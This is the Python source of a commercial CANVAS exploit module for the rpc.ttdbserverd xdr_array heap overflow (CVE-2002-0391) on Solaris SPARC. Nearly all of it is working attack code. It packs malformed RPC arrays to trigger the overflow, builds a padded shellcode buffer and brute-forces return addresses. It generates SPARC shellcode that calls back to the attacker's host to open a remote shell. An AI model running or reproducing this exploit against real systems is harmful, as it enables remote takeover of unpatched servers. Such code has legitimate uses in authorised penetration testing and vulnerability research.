#! /usr/bin/env python
"""


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import os,getopt
import sys

if "." not in sys.path: sys.path.append(".")

from libs import rpc
from libs.rpc import Packer, Unpacker, TCPClient
from libs import xdr
import socket
import timeoutsocket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import random
import canvasengine

import string
import struct
import random
import select

NAME="rpc.ttdbserverd xdr_array Heap Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="Jul 30, 2002"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2002-25.html"
DOCUMENTATION["CVE Name"] = "CVE-2002-0391"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0391"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F46122"
DOCUMENTATION["Patch Info"]="Solaris 2.5.1: 103640-42, Solaris 2.6: 105401-39 and 106639-07, Solaris 7: 106942-22 and 108451-06, Solaris 8: 108827-30 and 108901-06, Solaris 9: 113319-01 and 112233-02"

DESCRIPTION="rpc.ttdbserverd xdr_array Heap Overflow"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris", "sparc"] ]
PROPERTY["VERSION"]= ["2.5", "2.6", "7", "8", "9"] 

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

from ttdb import TTDB_Client as ttdb2client
from ttdb import TTDB_Packer as ttdb2pack
from ttdb import TTDBException
from ttdb import TTDB_Unpacker as ttdb2unpack

class TTDB_Packer(ttdb2pack, Packer):
    
    def pack_dequeue_msgs(self, retloc):
        
        self.pack_string("A"*120)
        
        self.pack_uint(0x40000004)
        
        for each in range(0, 4):
            self.pack_string("ABCD"*10)

        self.pack_uint(0x544c8)
        
        #print "Done packing payload."

    def pack_addsession(self, retloc):
        
        self.pack_int(1)
        self.pack_bool(0)
        self.pack_int(1)
        self.pack_array([1,2,3,4], self.pack_int)
        
        #ovf vector
        self.pack_uint(0xffffffffL)
        self.pack_fstring(4000,"C"*4000)
            
        #print "Done packing payload."
        
    def pack_create_obj_args(self, ra):
        
        retloc, payload = ra
        
        self.pack_int(0x20)
        self.pack_fstring(0x20, "Z"*0x20)
        
        self.pack_string("ABCD"*8)
        self.pack_string("ABCD"*8)
        
        #array of tt_property
        self.pack_uint(2)
        for i in [1, 2]:
            
            self.pack_string("C"*80)
            
            self.pack_uint(0x40000004)
            for each in range(0, 5):
                self.pack_string(struct.pack(">L", retloc) * 8)
            
            self.pack_uint(0x5678)
            self.pack_fstring(len(payload), payload)
            #will break trying to copy more than avaliable
            #self.pack_uint(0x12345678)
            
        self.pack_int(0)
        self.pack_int(0)
        self.pack_int(755)
        
        print "Done packing payload."

class TTDB_Unpacker(ttdb2unpack, Unpacker):
    
    def unpack_dequeue_msgs(self):
        return

class TTDB_Client(ttdb2client, TCPClient):
    
    def ttdb_dequeue_msgs(self):
        
        self.packer = TTDB_Packer()
        self.unpacker = TTDB_Unpacker("")
        
        self.ttdb_d["TT_DEQUEUE_MESSAGES"] = 132
        
        return self.make_call(self.ttdb_d["TT_DEQUEUE_MESSAGES"], None,\
                              self.packer.pack_dequeue_msgs,\
                              self.unpacker.unpack_dequeue_msgs)
    
    def ttdb_addsession(self):
        
        self.packer = TTDB_Packer()
        self.unpacker = TTDB_Unpacker("")
        
        self.ttdb_d["TT_ADDSESSION"] = 22
        
        return self.make_call(self.ttdb_d["TT_ADDSESSION"], None,\
                              self.packer.pack_addsession,\
                              self.unpacker.unpack_dequeue_msgs)
    
    def ttdb_create_obj_args(self, retloc, payload):
        
        self.packer = TTDB_Packer()
        self.unpacker = TTDB_Unpacker("")
        
        self.ttdb_d["TT_CREATE_OBJ"] = 104
        
        return self.make_call(self.ttdb_d["TT_CREATE_OBJ"], (retloc, payload),\
                              self.packer.pack_create_obj_args,\
                              self.unpacker.unpack_dequeue_msgs)

class TTDBExploit(TTDB_Client):
    
    def __init__(self, target="", timeout = 10, getsock=None):
        self.tm = timeout
        self.set_target(target)
        self.getsock=getsock

    def set_target(self, ip):
        try:
            self.targethost = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise TTDBException, "TTDBExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            print "Connecting to %s"%self.host
            TTDB_Client.__init__(self, self.host)
        #except (socket.error, RuntimeError), self.err:
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            raise TTDBException, "Failed to connect to the rpc.ttdbserverd daemon"
        
    def ttdb_makesploit(self):
       
        #shellcode len: 288
        self.scbuf = ""
        self.scbuf += struct.pack(">L", 0xa41c4011L) * ((1024/4) - (len(self.shellcode)/4))
        self.scbuf += self.shellcode
        self.scbuf += "\x00"
        
    def exploit(self):
        
        #win32 python required the following
        timeoutsocket.setDefaultSocketTimeout(5)
        
        for i in range(0, 30):
            #solaris 8
            retloc = 0x544a0
            
            self.setup()
            self.ttdb_makesploit()
            
            #raw_input("attach")
            
            if self.ISucceeded():
                self.log("Succeeded!")
                return 1
            
            try:
                #self.ttdb_dequeue_msgs()
                #self.ttdb_addsession()
                self.log("Attacking: %d/%d"%(i,30))
                self.ttdb_create_obj_args(retloc, self.scbuf)
            except Exception, msg:
                print str(msg)
                
            time.sleep(2)
            #check if ny shell listener.
            if self.ISucceeded():
                self.log("Succeeded!")
                return 1
            
            retloc += 1024
        
        #self.log("Exploit failed.") #sometimes it might succeeded just after our ISuccess check.
        return 0
        
class theexploit(tcpexploit, TTDBExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x20\x00\\/.:?\r\n%?"
        self.setInfo(DESCRIPTION)
        self.name=NAME
        return

    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Calling back to %s:%d"%(localhost,localport))
        return self.createSparcShellcode(self.badstring, localhost,localport)    
       
    def neededListenerTypes(self):
            return [canvasengine.SOLARISSPARCMOSDEF]
        
    def test(self):       
        self.socknode=self.argsDict.get("passednodes",[None])[0]
        self.getsock=self.socknode
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        try:
            TTDB_Client.__init__(self, self.host,getsock=self.socknode)
        except:
            self.log("Test failed...")
            return 0
        self.log("rpc.ttdbserverd is running on the remote end.")
        return 1
    
    def run(self):
        #print "Run was called"
        self.socknode=self.argsDict.get("passednodes",[None])[0]        
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        self.getsock=self.socknode

        try:
            return self.dorun()
        except TTDBException, self.expstr:
            self.log(str(self.expstr))
            return 0
        
    def dorun(self):
        self.exploit()
        return
    
    #returns the sploitstring, see xdmi_makesploit
    def makesploit(self):
        pass

    def displayVersions(self):
        print "0 : Solaris 7, 8, 9 Ultra "
        print "1 : Solaris 2.6 Ultra "
        return
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
        
